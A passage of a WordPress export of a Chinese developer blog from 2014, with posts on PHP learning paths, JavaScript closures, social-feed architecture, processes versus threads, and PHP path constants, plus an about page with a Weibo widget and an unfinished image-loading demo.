rel="noopener noreferrer">@veitor_424</a> 吧！</p><p><strong>下面依旧是惯例，记录本博的历程：</strong></p><p>2014年3月30日  博客开通。<br />项目：<br /><a href="http://house.hualongxiang.com">http://house.hualongxiang.com</a><br /><a href="http://fang.hualongxiang.com">http://fang.hualongxiang.com</a><br /><a href="http://food.hualongxiang.com">http://food.hualongxiang.com</a><br /><a href="http://vip.hualongxiang.com">http://vip.hualongxiang.com</a><br /><a href="http://www.hualongxiang.com">http://www.hualongxiang.com</a><br /><a href="http://bbs.hualongxiang.com">http://bbs.hualongxiang.com</a></p><p>&lt;script src=&quot;<a href="http://tjs.sjs.sinajs.cn/open/api/js/wb.js?appkey=706960568&quot">http://tjs.sjs.sinajs.cn/open/api/js/wb.js?appkey=706960568&quot</a>; type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;</p><p>&lt;script&gt;<br />WB2.anyWhere(function(W){<br />    W.widget.hoverCard({<br />        id : "mywb"<br />    });<br />});<br />&lt;/script&gt;</p>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>6</wp:post_id>
		<wp:post_date><![CDATA[2014-03-30 04:13:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-03-30 04:13:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[about]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[page]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
														<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_page_template]]></wp:meta_key>
		<wp:meta_value><![CDATA[default]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>想成为PHPer 你都要干些什么</title>
		<link>http://wp.veitor.net/2014/04/11/%e6%83%b3%e6%88%90%e4%b8%baphper-%e4%bd%a0%e9%83%bd%e8%a6%81%e5%b9%b2%e4%ba%9b%e4%bb%80%e4%b9%88/</link>
		<pubDate>Fri, 11 Apr 2014 07:58:32 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=19</guid>
		<description></description>
		<content:encoded><![CDATA[<strong>phper刚入门的思考以下问题</strong>：
修改过别人的开源代码没？
oop熟悉吗，class自省ok？
mvc知道吗？设计过吗？
framework你知道几个？代码研究过没？
js库用过几个？
sql掌握得怎样了？
<strong>phper 一两年的思考以下问题：</strong>
php安全你研究透了？
分布式应用你懂吗？
缓存你懂得多少？
soap你也用过了？
unix，linux系统你能拿几分，简单shell你也ok了？
mysql你真懂了吗？
sql优化你也在行了？
js你写吗？水平怎样了？…………
<strong></strong><strong>3年以上的：</strong>
c语言懂吗？
php 内核研究过没？
写php拓展没问题吗？
webservice ok吗？
你有带队的能力吗？…………]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>19</wp:post_id>
		<wp:post_date><![CDATA[2014-04-11 07:58:32]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-11 07:58:32]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e6%83%b3%e6%88%90%e4%b8%baphper-%e4%bd%a0%e9%83%bd%e8%a6%81%e5%b9%b2%e4%ba%9b%e4%bb%80%e4%b9%88]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>JavaScript中的匿名函数及函数的闭包</title>
		<link>http://wp.veitor.net/2014/04/11/javascript%e4%b8%ad%e7%9a%84%e5%8c%bf%e5%90%8d%e5%87%bd%e6%95%b0%e5%8f%8a%e5%87%bd%e6%95%b0%e7%9a%84%e9%97%ad%e5%8c%85/</link>
		<pubDate>Fri, 11 Apr 2014 07:59:49 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=22</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>1、匿名函数</h3>
函数是JavaScript中最灵活的一种对象，这里只是讲解其匿名函数的用途。匿名函数：就是没有函数名的函数。
<h4>1.1 函数的定义，首先简单介绍一下函数的定义，大致可分为三种方式</h4>
第一种：这也是最常规的一种
<div>
<pre>function double(x){
    return 2 * x;
}</pre>
</div>
第二种：这种方法使用了Function构造函数，把参数列表和函数体都作为字符串，很不方便，不建议使用。
<div>
<pre>var double = new Function('x', 'return 2 * x;');</pre>
</div>
第三种：
<div>
<pre>var double = function(x) { return 2* x; }</pre>
</div>
注意“=”右边的函数就是一个匿名函数，创造完毕函数后，又将该函数赋给了变量square。
<h4>1.2 匿名函数的创建</h4>
第一种方式：就是上面所讲的定义square函数，这也是最常用的方式之一。
第二种方式：
<div>
<pre>(function(x, y){
    alert(x + y);
})(2, 3);</pre>
</div>
这里创建了一个匿名函数(在第一个括号内)，第二个括号用于调用该匿名函数，并传入参数。
<a href="http://www.cnblogs.com/rainman/archive/2009/05/04/1448899.html#" name="m1"></a>
<h3>2、闭包</h3>
闭包的英文单词是closure，这是JavaScript中非常重要的一部分知识，因为使用闭包可以大大减少我们的代码量，使我们的代码看上去更加清晰等等，总之功能十分强大。
闭包的含义：闭包说白了就是函数的嵌套，内层的函数可以使用外层函数的所有变量，即使外层函数已经执行完毕（这点涉及JavaScript作用域链）。
<h4>示例一</h4>
<div>
<pre>function checkClosure(){
    var str = 'rain-man';
    setTimeout(
        function(){ alert(str); } //这是一个匿名函数
    , 2000);
}
checkClosure();</pre>
</div>
这个例子看上去十分的简单，仔细分析下它的执行过程还是有许多知识点的：checkClosure函数的执行是瞬间的（也许用时只是0.00001毫秒），在checkClosure的函数体内创建了一个变量str，在checkClosure执行完毕之后str并没有被释放，这是因为setTimeout内的匿名函数存在这对str的引用。待到2秒后函数体内的匿名函数被执行完毕,str才被释放。
<h4>示例二，优化代码</h4>
<div>
<pre>function forTimeout(x, y){
    alert(x + y);
}
function delay(x , y  , time){
    setTimeout('forTimeout(' +  x + ',' +  y + ')' , time);
}
/**
 * 上面的delay函数十分难以阅读，也不容易编写，但如果使用闭包就可以让代码更加清晰
 * function delay(x , y , time){
 *     setTimeout(
 *         function(){
 *             forTimeout(x , y)
 *         }
 *     , time);
 * }
 */</pre>
</div>
<a href="http://www.cnblogs.com/rainman/archive/2009/05/04/1448899.html#" name="m2"></a>
<h3>3、举例</h3>
匿名函数最大的用途是创建闭包（这是JavaScript语言的特性之一），并且还可以构建命名空间，以减少全局变量的使用。
<h4>示例三：</h4>
<div>
<pre>var oEvent = {};
(function(){
    var addEvent = function(){ /*代码的实现省略了*/ };
    function removeEvent(){}
    oEvent.addEvent = addEvent;
    oEvent.removeEvent = removeEvent;
})();</pre>
</div>
在这段代码中函数addEvent和removeEvent都是局部变量，但我们可以通过全局变量oEvent使用它，这就大大减少了全局变量的使用，增强了网页的安全性。 我们要想使用此段代码：oEvent.addEvent(document.getElementById('box') , 'click' , function(){});
<h4>示例四：</h4>
<div>
<pre>var rainman = (function(x , y){
    return x + y;
})(2 , 3);
/**
 * 也可以写成下面的形式，因为第一个括号只是帮助我们阅读，但是不推荐使用下面这种书写格式。
 * var rainman = function(x , y){
 *    return x + y;
 * }(2 , 3);
 */</pre>
</div>
在这里我们创建了一个变量rainman，并通过直接调用匿名函数初始化为5，这种小技巧有时十分实用。
<h4>示例五：</h4>
<div>
<pre>var outer = null;
(function(){
    var one = 1;
    function inner (){
        one += 1;
        alert(one);
    }
    outer = inner;
})();
outer();    //2
outer();    //3
outer();    //4</pre>
</div>
这段代码中的变量one是一个局部变量（因为它被定义在一个函数之内），因此外部是不可以访问的。但是这里我们创建了inner函数，inner函数是可以访问变量one的；又将全局变量outer引用了inner，所以三次调用outer会弹出递增的结果。
<a href="http://www.cnblogs.com/rainman/archive/2009/05/04/1448899.html#" name="m3"></a>
<h3>4、注意</h3>
<h4>4.1 闭包允许内层函数引用父函数中的变量，但是该变量是最终值</h4>
示例六：
<div>
<pre>/**
 * &lt;body&gt;
 * &lt;ul&gt;
 *     &lt;li&gt;one&lt;/li&gt;
 *     &lt;li&gt;two&lt;/li&gt;
 *     &lt;li&gt;three&lt;/li&gt;
 *     &lt;li&gt;one&lt;/li&gt;
 * &lt;/ul&gt;
 */
var lists = document.getElementsByTagName('li');
for(var i = 0 , len = lists.length ; i &lt; len ; i++){
    lists[ i ].onmouseover = function(){
        alert(i);
    };
}</pre>
</div>
你会发现当鼠标移过每一个&lt;li&amp;rt;元素时，总是弹出4，而不是我们期待的元素下标。这是为什么呢？注意事项里已经讲了（最终值）。显然这种解释过于简单，当mouseover事件调用监听函数时，首先在匿名函数（ function(){ alert(i); }）内部查找是否定义了 i，结果是没有定义；因此它会向上查找，查找结果是已经定义了，并且i的值是4（循环后的i值）；所以，最终每次弹出的都是4。
解决方法一：
<div>
<pre>var lists = document.getElementsByTagName('li');
for(var i = 0 , len = lists.length ; i &lt; len ; i++){
    (function(index){
        lists[ index ].onmouseover = function(){
            alert(index);
        };
    })(i);
}</pre>
</div>
解决方法二：
<div>
<pre>var lists = document.getElementsByTagName('li');
for(var i = 0, len = lists.length; i &lt; len; i++){
    lists[ i ].$$index = i;    //通过在Dom元素上绑定$$index属性记录下标
    lists[ i ].onmouseover = function(){
        alert(this.$$index);
    };
}</pre>
</div>
解决方法三：
<div>
<pre>function eventListener(list, index){
    list.onmouseover = function(){
        alert(index);
    };
}
var lists = document.getElementsByTagName('li');
for(var i = 0 , len = lists.length ; i &lt; len ; i++){
    eventListener(lists[ i ] , i);
}</pre>
</div>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>22</wp:post_id>
		<wp:post_date><![CDATA[2014-04-11 07:59:49]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-11 07:59:49]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[javascript%e4%b8%ad%e7%9a%84%e5%8c%bf%e5%90%8d%e5%87%bd%e6%95%b0%e5%8f%8a%e5%87%bd%e6%95%b0%e7%9a%84%e9%97%ad%e5%8c%85]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="js"><![CDATA[JS]]></category>
						</item>
					<item>
		<title>SNS网站Feed功能设计</title>
		<link>http://wp.veitor.net/2014/04/11/sns%e7%bd%91%e7%ab%99feed%e5%8a%9f%e8%83%bd%e8%ae%be%e8%ae%a1/</link>
		<pubDate>Fri, 11 Apr 2014 08:00:56 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=25</guid>
		<description></description>
		<content:encoded><![CDATA[在SNS的网站中，最核心的功能就是Feed功能，Feed就是一条twitter或一条好友动态。该功能面临的挑战是：每天产生成千上万条数据，数据推送的需要实时性等，做网站其实最大的难点就是对海量数据和高并发的处理。本人通过对Twitter和新浪微博架构的一些资料的学习，大致了解了如何实现一个Feed功能。一个Feed功能往往有多种实现方式，最常见的是这3种：推模式、拉模式、推拉结合模式。
<strong>推模式：</strong>
推就是把自己的发的feed推送到每个粉丝那里，就是一条feed在数据库中存储多份，做法就将feed表按userId分库，对应粉丝Id的库中插一条记录。这种做法的缺点就是数据量大，数据冗余太严重，如一个明星用户有1000万粉丝，那么他发一条feed,就要产生1000万条记录。Feed的推送需要异步队列，队列的好处就是降并发，推送是需要时间的，所以一个明星发了一条feed后，当最后那个粉丝看到这条feed可能已经是几分钟后的事情了。这种模式的优点是用户查看Feed就很容易了，根据userId查询就可以了。这种做法是牺牲大量储存空间来换取网站的查看性能。
<strong>拉模式：</strong>
拉就是用户要查看动态时就去每个关注者那边找，然后聚合并展现。Feed数据只储存一份，省了很多空间。这种模式在用户量较小的网站就很容易实现，展示只要一条SQL语句。但是当用户多了以后就会遇到问题，比如我关注了2000个用户，而这2000个用户都是活跃用户，每天都会产生很多feed。我查看 feed时就要去2000个关注者那里找最新的几条，合并和按时间排序，每次查看一条查询语句就快把数据库搞得累死，而且合并和排序这些feed计算量太大。拉模式在用户关注人数很多的网站不太适合。
<strong>推拉结合：</strong>
顾名思义就是两种模式的结合，将两者的优点结合。不活跃的用户（偶偶上线，关注人数又少的僵死用户等）推送的时候就不要推送给他们，省点资源，当他们上线查看时就直接拉，因为他们关注的人比较少，拉也不是很耗性能。
最后，不管采用什么方法实现，少不了异步队列，nosql等工具。比如发表feed的时候就往队列里一扔，前端马上返回，异步慢慢处理，而用户一点也察觉不出来。Nosql缓存，比如一些计数（关注数、粉丝数神马的）直接用redis、TT等储存，还有feed列表可以存储在memcached或redis 中，redis的list功能很适合这种情形，但是一些大网站还不敢这么做。
以上借鉴于新浪微博架构PPT。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>25</wp:post_id>
		<wp:post_date><![CDATA[2014-04-11 08:00:56]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-11 08:00:56]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[sns%e7%bd%91%e7%ab%99feed%e5%8a%9f%e8%83%bd%e8%ae%be%e8%ae%a1]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="sjms"><![CDATA[设计模式]]></category>
						</item>
					<item>
		<title>进程与线程及其区别</title>
		<link>http://wp.veitor.net/2014/04/13/%e8%bf%9b%e7%a8%8b%e4%b8%8e%e7%ba%bf%e7%a8%8b%e5%8f%8a%e5%85%b6%e5%8c%ba%e5%88%ab/</link>
		<pubDate>Sun, 13 Apr 2014 05:15:28 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=31</guid>
		<description></description>
		<content:encoded><![CDATA[<span style="font-family: 宋体;"><strong><span style="font-size: x-large;">1.进程和线程</span></strong></span>
<h2><span style="font-family: 黑体;">1.1 概述:</span></h2>
进程是具有一定独立功能的程序关于某个数据集合上的一次运行活动<span style="font-family: 宋体;">,进程是系统进行资源分配和调度的一个独立单位.</span>
线程是进程的一个实体<span style="font-family: 宋体;">,是CPU调度和分派的基本单位,它是比进程更小的能独立运行的基本单位.线程自己基本上不拥有系统资源,只拥有一点在运行中必不可少的资源(如程序计数器,一组寄存器和栈),但是它可与同属一个进程的其他的线程共享进程所拥有的全部资源.</span>
一个线程可以创建和撤销另一个线程<span style="font-family: 宋体;">;同一个进程中的多个线程之间可以并发执行.</span>
相对进程而言，线程是一个更加接近于执行体的概念，它可以与同进程中的其他线程共享数据，但拥有自己的栈空间，拥有独立的执行序列。
在串行程序基础上引入线程和进程是为了提高程序的并发度，从而提高程序运行效率和响应时间。
<h2><span style="font-family: 黑体;">1.2 区别:</span></h2>
进程和线程的主要差别在于它们是不同的操作系统资源管理方式。进程有独立的地址空间，一个进程崩溃后，在保护模式下不会对其它进程产生影响，而线程只是一个进程中的不同执行路径。线程有自己的堆栈和局部变量，但线程之间没有单独的地址空间，一个线程死掉就等于整个进程死掉，所以多进程的程序要比多线程的程序健壮，但在进程切换时，耗费资源较大，效率要差一些。<b>但对于一些要求同时进行并且又要共享某些变量的并发操作，只能用线程，不能用进程。</b>
<span style="font-family: 宋体;"><b>1) </b><b>简而言之</b><b>,</b><b>一个程序至少有一个进程</b><b>,</b><b>一个进程至少有一个线程</b><b>.</b></span>
<span style="font-family: 宋体;">2) 线程的划分尺度小于进程，使得多线程程序的并发性高。</span>
<span style="font-family: 宋体;">3) 另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。</span>
<span style="font-family: 宋体;">4) </span>线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。<b>但是线程不能够独立执行，</b>必须依存在应用程序中，由应用程序提供多个线程执行控制。
<span style="font-family: 宋体;">5) </span>从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。<b>这就是进程和线程的重要区别。</b><b></b>
<h2><span style="font-family: 黑体;">1.3 优缺点:</span></h2>
线程和进程在使用上各有优缺点：线程执行开销小，但不利于资源的管理和保护；而进程正相反。同时，线程适合于在<span style="font-family: 宋体;">SMP机器上运行，而进程则可以跨机器迁移。</span>
<span style="font-family: 宋体;"><strong><span style="font-size: x-large;">2.多进程，多线程</span></strong></span>
<h2><span style="font-family: 黑体;">2.1 概述:</span></h2>
进程就是一个程序运行的时候被<span style="font-family: 宋体;">CPU抽象出来的，一个程序运行后被抽象为一个进程，但是线程是从一个进程里面分割出来的，由于CPU处理进程的时候是采用时间片轮转的方式，所以要把一个大个进程给分割成多个线程，例如：网际快车中文件分成100部分 10个线程 文件就被分成了10份来同时下载 1-10 占一个线程 11-20占一个线程,依次类推,线程越多,文件就被分的越多,同时下载 当然速度也就越快</span>
<b>进程是程序在计算机上的一次执行活动。</b>当你运行一个程序，你就启动了一个进程。显然，程序只是一组指令的有序集合，它本身没有任何运行的含义，只是一个静态实体。而进程则不同，它是程序在某个数据集上的执行，是一个动态实体。它因创建而产生，因调度而运行，因等待资源或事件而被处于等待状态，因完成任务而被撤消，反映了一个程序在一定的数据集上运行的全部动态过程。<b>进程是操作系统分配资源的单位。</b>在<span style="font-family: 宋体;">Windows下，进程又被细化为线程，也就是一个进程下有多个能独立运行的更小的单位。<b>线程</b><b>(Thread)</b><b>是进程的一个实体，是</b><b>CPU</b><b>调度和分派的基本单位。</b></span>线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制。
<b>线程和进程的关系是：</b>线程是属于进程的，线程运行在进程空间内，同一进程所产生的线程共享同一内存空间，当进程退出时该进程所产生的线程都会被强制退出并清除。线程可与属于同一进程的其它线程共享进程所拥有的全部资源，但是其本身基本上不拥有系统资源，只拥有一点在运行中必不可少的信息<span style="font-family: 宋体;">(如程序计数器、一组寄存器和栈)。</span>
在同一个时间里，同一个计算机系统中如果允许两个或两个以上的进程处于运行状态，这便是多任务。现代的操作系统几乎都是多任务操作系统，能够同时管理多个进程的运行。<span style="font-family: 宋体;"> 多任务带来的好处是明显的，比如你可以边听mp3边上网，与此同时甚至可以将下载的文档打印出来，而这些任务之间丝毫不会相互干扰。那么这里就涉及到并行的问题，俗话说，一心不能二用，这对计算机也一样，原则上一个CPU只能分配给一个进程，以便运行这个进程。我们通常使用的计算机中只有一个CPU，也就是说只有一颗心，要让它一心多用，同时运行多个进程，就必须使用并发技术。实现并发技术相当复杂，<b>最容易理解的是“时间片轮转进程调度算法”，</b>它的思想简单介绍如下：在操作系统的管理下，所有正在运行的进程轮流使用CPU，每个进程允许占用CPU的时间非常短(比如10毫秒)，这样用户根本感觉不出来CPU是在轮流为多个进程服务，就好象所有的进程都在不间断地运行一样。但实际上在任何一个时间内有且仅有一个进程占有CPU。</span>
如果一台计算机有多个<span style="font-family: 宋体;">CPU，情况就不同了，如果进程数小于CPU数，则不同的进程可以分配给不同的CPU来运行，这样，多个进程就是真正同时运行的，这便是并行。但如果进程数大于CPU数，则仍然需要使用并发技术。</span>
<b>在</b><span style="font-family: 宋体;"><b>Windows</b><b>中，进行</b><b>CPU</b><b>分配是以线程为单位的，</b>一个进程可能由多个线程组成，这时情况更加复杂，但简单地说，有如下关系：</span>
总线程数<span style="font-family: 宋体;">&lt;= CPU数量：并行运行</span>
总线程数<span style="font-family: 宋体;">&gt; CPU数量：并发运行</span>
并行运行的效率显然高于并发运行，所以在多<span style="font-family: 宋体;">CPU的计算机中，多任务的效率比较高。但是，如果在多CPU计算机中只运行一个进程(线程)，就不能发挥多CPU的优势。</span>
<span style="font-family: 宋体;"> 多任务操作系统(如Windows)的基本原理是:操作系统将CPU的时间片分配给多个线程,每个线程在操作系统指定的时间片内完成(注意,这里的多个线程是分属于不同进程的).操作系统不断的从一个线程的执行切换到另一个线程的执行,如此往复,宏观上看来,就好像是多个线程在一起执行.由于这多个线程分属于不同的进程,因此在我们看来,就好像是多个进程在同时执行,这样就实现了多任务.</span>
<h2><span style="font-family: 黑体;"> 2.2 分类</span></h2>
根据进程与线程的设置，操作系统大致分为如下类型：
<span style="font-family: 宋体;">(1) 单进程、单线程，MS-DOS大致是这种操作系统；</span>
<span style="font-family: 宋体;">(2) 多进程、单线程，多数UNIX(及类UNIX的LINUX)是这种操作系统；</span>
<span style="font-family: 宋体;">(3) 多进程、多线程，Win32(Windows NT/2000/XP等)、Solaris 2.x和OS/2都是这种操作系统；</span>
<span style="font-family: 宋体;">(4) 单进程、多线程，VxWorks是这种操作系统。</span>
<h2><span style="font-family: 黑体;">2.3 引入线程带来的主要好处：</span></h2>
<span style="font-family: 宋体;">(1) 在进程内创建、终止线程比创建、终止进程要快；</span>
<span style="font-family: 宋体;">(2) 同一进程内的线程间切换比进程间的切换要快,尤其是用户级线程间的切换。</span>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>31</wp:post_id>
		<wp:post_date><![CDATA[2014-04-13 05:15:28]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-13 05:15:28]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e8%bf%9b%e7%a8%8b%e4%b8%8e%e7%ba%bf%e7%a8%8b%e5%8f%8a%e5%85%b6%e5%8c%ba%e5%88%ab]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e7%ba%bf%e7%a8%8b"><![CDATA[线程]]></category>
		<category domain="category" nicename="xitong"><![CDATA[计算机系统]]></category>
		<category domain="post_tag" nicename="%e8%bf%9b%e7%a8%8b"><![CDATA[进程]]></category>
						</item>
					<item>
		<title>关于PHP构造函数的返回值</title>
		<link>http://wp.veitor.net/?p=34</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=34</guid>
		<description></description>
		<content:encoded><![CDATA[在今天写的一个小项目中，遇到了这样的一个问题：我在一个类的构造函数中使用了return，如：
public function]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>34</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[34]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>魔术常量__DIR__和__FILE__的用法区别</title>
		<link>http://wp.veitor.net/2014/04/21/%e9%ad%94%e6%9c%af%e5%b8%b8%e9%87%8f__dir__%e5%92%8c__file__%e7%9a%84%e7%94%a8%e6%b3%95%e5%8c%ba%e5%88%ab/</link>
		<pubDate>Mon, 21 Apr 2014 03:28:31 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=37</guid>
		<description></description>
		<content:encoded><![CDATA[在写PHP脚本的时候，要定义一个文件目录的绝对路径，通常会使用这两种PHP内置的魔术方法：__DIR__和dirname(__FILE__)
我们可以用var_dump把这两个方法显示结果打印出来看一下
<pre class="lang:php decode:true">string 'E:\project\newapp' (length=17)</pre>
你会发现，两个打印结果一样。
但其实他们至少有两处区别：
<ol>
	<li>__DIR__只能用于PHP &gt;= 5.3 版本，这也是为什么大多数你看到的代码中都是使用的dirname(__FILE__)这种写法</li>
	<li>__DIR__在编译时运算的，而dirname(__FILE__)要调用函数且在执行时运算</li>
</ol>
&nbsp;
其他可以参考一下PHP手册，
__DIR__：文件所在的目录。如果用在被包括文件中，则返回被包括的文件所在的目录。它等价于<em>dirname(__FILE__)</em>。除非是根目录，否则目录中名不包括末尾的斜杠。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>37</wp:post_id>
		<wp:post_date><![CDATA[2014-04-21 03:28:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2014-04-21 03:28:31]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[%e9%ad%94%e6%9c%af%e5%b8%b8%e9%87%8f__dir__%e5%92%8c__file__%e7%9a%84%e7%94%a8%e6%b3%95%e5%8c%ba%e5%88%ab]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>Yii框架分析（一）</title>
		<link>http://wp.veitor.net/?p=62</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=62</guid>
		<description></description>
		<content:encoded><![CDATA[因公司PHP开发采用的是Yii+Smarty，因此对Yii的使用必不可少，使用多了，你会发现Yii有很多优点。当然，我也只是刚用Yii没多久，但抱着刨根问底的精神，既然用Yii那么咱就摸清它的工作原理，一起分析一下框架。也从今天开始，我将分多篇文章逐步分析Yii。接下来我们就直接入正题：
&nbsp;]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>62</wp:post_id>
		<wp:post_date><![CDATA[1970-01-01 00:00:00]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[1970-01-01 00:00:00]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[62]]></wp:post_name>
		<wp:status><![CDATA[draft]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="php"><![CDATA[PHP]]></category>
						</item>
					<item>
		<title>imgreadydemo</title>
		<link>http://wp.veitor.net/?page_id=82</link>
		<pubDate>Thu, 01 Jan 1970 00:00:00 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">http://www.veitor.net/?p=82</guid>
		<description></description>
		<content:encoded><![CDATA[img ready demo
<script type="text/javascript" src="imgReady.js"></script>
<style><!--
/*demo style*/
body { font:12px 'Microsoft Yahei', Tahoma, Arial; _font-family:Tahoma, Arial; }
a { color:#0259C4; }
a:hover { color:#900; }
.tips { color:#CCC; }
h1 { font-family:'Constantia';}
#path { width:36em; padding:5px; border:2px solid #0259C4; background:#FAFAFA;-webkit-border-radius:3px; -moz-border-radius:3px; border-radius:3px; }
#path:focus { background:#FFFFF7; outline:0; }
#submit { padding:5px 10px; border:2px solid #0259C4; background:#0259C4; color:#FFF; -webkit-border-radius:3px; -moz-border-radius:3px; border-radius:3px; cursor:pointer; }
#submit.disabled { background:#D7D7D7; color:#ABABAB; border-color:#ABABAB; cursor:default; }
--></style>
<script type="text/javascript">// <![CDATA[
/* demo script */
window.onload = function () {
	var $ = function (id) {
		return document.getElementById(id);
	};
	var Timer = function (){
		this.startTime = (new Date()).getTime();
	};
	Timer.prototype.stop = function(){
		return (new Date()).getTime() - this.startTime;
	};
	var imgUrl,
		checkboxFn,
		path		= $('path'),
		submit		= $('submit'),
		checkbox	= $('checkbox'),
		clsCache	= $('clsCache'),
		status		= $('status'),
		statusReady	= $('statusReady'),
		statusLoad	= $('statusLoad'),
